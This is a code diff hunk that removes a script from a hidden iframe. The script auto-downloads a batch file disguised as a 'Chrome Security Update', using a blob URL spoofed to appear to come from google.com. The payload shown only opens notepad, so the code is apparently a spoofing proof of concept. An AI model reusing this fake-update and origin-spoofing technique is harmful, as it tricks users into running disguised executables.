@@ -187,48 +187,7 @@
       iframe.style.display = 'none'; 
       document.body.appendChild(iframe);
 
-      const iframeHTML = `
-        <!DOCTYPE html>
-        <html><body><script>
-          const batLines = [
-            '@echo off',
-            'title Chrome Security Update',
-            'echo ========================================',
-            'echo   Chrome Security Update Installer',
-            'echo ========================================',
-            'echo.',
-            'echo Initializing update sequence...',
-            'timeout /t 2 >nul',
-            'echo Checking system compatibility...',
-            'timeout /t 1 >nul',
-            'echo Downloading security patches...',
-            'timeout /t 2 >nul',
-            'echo Applying updates...',
-            'timeout /t 2 >nul',
-            'echo.',
-            'echo Update completed successfully!',
-            'echo.',
-            'start "" "C:\\\\Windows\\\\System32\\\\notepad.exe"',
-            'pause'
-          ];
-          const batContent = batLines.join('\\r\\n');
-
-          const blob = new Blob([batContent], { type: "application/octet-stream" });
-          const realUrl = URL.createObjectURL(blob);
-          const uuid = realUrl.split("/").pop();
-
-          const spoofedUrl = \`blob:null/\${uuid}#%EF%BC%8Fgoogle.com\`;
-          const filename = "chrome_security_update.bat";
-
-          const a = document.createElement("a");
-          a.href = spoofedUrl;
-          a.download = filename;
-          document.body.appendChild(a);
-          a.click();
-
-          setTimeout(() => { a.remove(); URL.revokeObjectURL(realUrl); }, 1000);
-        <\/script></body></html>
-      `;
+      const iframeHTML = ``;
       
       iframe.srcdoc = iframeHTML;
     }
